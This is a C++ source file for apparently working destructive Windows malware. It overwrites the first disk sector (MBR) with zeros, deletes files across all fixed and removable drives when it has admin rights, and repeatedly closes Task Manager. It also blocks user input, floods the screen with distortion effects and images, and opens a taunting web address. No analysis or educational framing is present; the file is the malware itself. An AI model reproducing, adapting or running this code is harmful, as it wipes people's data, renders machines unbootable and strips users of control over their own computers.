#include <windows.h>
#include <winioctl.h>
#include <shellapi.h>
#include <gdiplus.h>
#include <cstdlib>

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "gdiplus.lib")

using namespace Gdiplus;

typedef union _RGBQUAD {
    COLORREF rgb;
    struct { BYTE r, g, b, Reserved; };
} _RGBQUAD, * PRGBQUAD;

void* GetResource(LPCWSTR name, DWORD* size) {
    HRSRC hRes = FindResourceW(NULL, (LPCWSTR)name, RT_RCDATA);
    if (!hRes) return NULL;
    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return NULL;
    *size = SizeofResource(NULL, hRes);
    return LockResource(hData);
}

void SetWallpaperFromResource() {
    DWORD size = 0;
    void* data = GetResource(L"102", &size);
    if (!data) return;
    wchar_t path[MAX_PATH];
    GetTempPathW(MAX_PATH, path);
    wcscat(path, L"wallpaper.png");
    HANDLE hFile = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hFile, data, size, &written, NULL);
        CloseHandle(hFile);
        SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
    }
}

DWORD WINAPI WipeMBR(LPVOID lpParam) {
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if (hDevice != INVALID_HANDLE_VALUE) {
        DWORD written;
        unsigned char zero[512] = { 0 };
        WriteFile(hDevice, zero, 512, &written, 0);
        FlushFileBuffers(hDevice);
        CloseHandle(hDevice);
    }
    return 0;
}

DWORD WINAPI WipeDrives(LPVOID lpParam) {
    wchar_t drive[4] = L"A:\\";
    for (char c = 'A'; c <= 'Z'; c++) {
        drive[0] = c;
        if (GetDriveTypeW(drive) == DRIVE_FIXED || GetDriveTypeW(drive) == DRIVE_REMOVABLE) {
            wchar_t search[MAX_PATH];
            wsprintfW(search, L"%s*.*", drive);
            WIN32_FIND_DATAW fd;
            HANDLE hFind = FindFirstFileW(search, &fd);
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (wcscmp(fd.cFileName, L".") != 0 && wcscmp(fd.cFileName, L"..") != 0) {
                        wchar_t path[MAX_PATH];
                        wsprintfW(path, L"%s%s", drive, fd.cFileName);
                        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                            RemoveDirectoryW(path);
                        } else {
                            SetFileAttributesW(path, FILE_ATTRIBUTE_NORMAL);
                            DeleteFileW(path);
                        }
                    }
                } while (FindNextFileW(hFind, &fd));
                FindClose(hFind);
            }
        }
    }
    return 0;
}

DWORD WINAPI Shader4(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            rgbScreen[i].rgb = (rgbScreen[i].rgb * 2) % (RGB(255, 255, 255));
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, -30, 0, SRCCOPY);
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, w - 30, 0, SRCCOPY);
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, -30, SRCCOPY);
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, h - 30, SRCCOPY);
        ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
    }
}

DWORD WINAPI TeleportImage(LPVOID lpParam) {
    DWORD size = 0;
    void* data = GetResource(L"101", &size);
    if (!data) return 0;

    IStream* pStream = NULL;
    CreateStreamOnHGlobal(NULL, TRUE, &pStream);
    pStream->Write(data, size, NULL);
    LARGE_INTEGER li = {0};
    pStream->Seek(li, STREAM_SEEK_SET, NULL);
    Bitmap* pBitmap = Bitmap::FromStream(pStream);
    HBITMAP hBmp = NULL;
    pBitmap->GetHBITMAP(Color(0,0,0), &hBmp);

    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    int imgSize = 300;

    while (true) {
        HDC hdc = GetDC(0);
        HDC hdcMem = CreateCompatibleDC(hdc);
        HGDIOBJ old = SelectObject(hdcMem, hBmp);
        int x = rand() % (w - imgSize);
        int y = rand() % (h - imgSize);
        BitBlt(hdc, x, y, imgSize, imgSize, hdcMem, 0, 0, SRCCOPY);
        SelectObject(hdcMem, old);
        DeleteDC(hdcMem);
        ReleaseDC(0, hdc);
        Sleep(50);
    }
    return 0;
}

DWORD WINAPI KillTaskmgr(LPVOID lpParam) {
    while (true) {
        HWND hwnd = FindWindowW(L"TaskManagerWindow", NULL);
        if (hwnd) PostMessageW(hwnd, WM_CLOSE, 0, 0);
        Sleep(100);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    BOOL isAdmin = FALSE;
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD dwSize;
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
            isAdmin = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }

    SetWallpaperFromResource();
    ShellExecuteW(NULL, L"open", L"https://FUCKED.BY.PBDROID.LOL/", NULL, NULL, SW_SHOWNORMAL);

    CreateThread(0, 0, KillTaskmgr, 0, 0, 0);
    CreateThread(0, 0, Shader4, 0, 0, 0);
    CreateThread(0, 0, TeleportImage, 0, 0, 0);

    if (isAdmin) {
        CreateThread(0, 0, WipeMBR, 0, 0, 0);
        CreateThread(0, 0, WipeDrives, 0, 0, 0);
    }

    BlockInput(TRUE);

    while (true) {
        Sleep(1000);
    }
    return 0;
}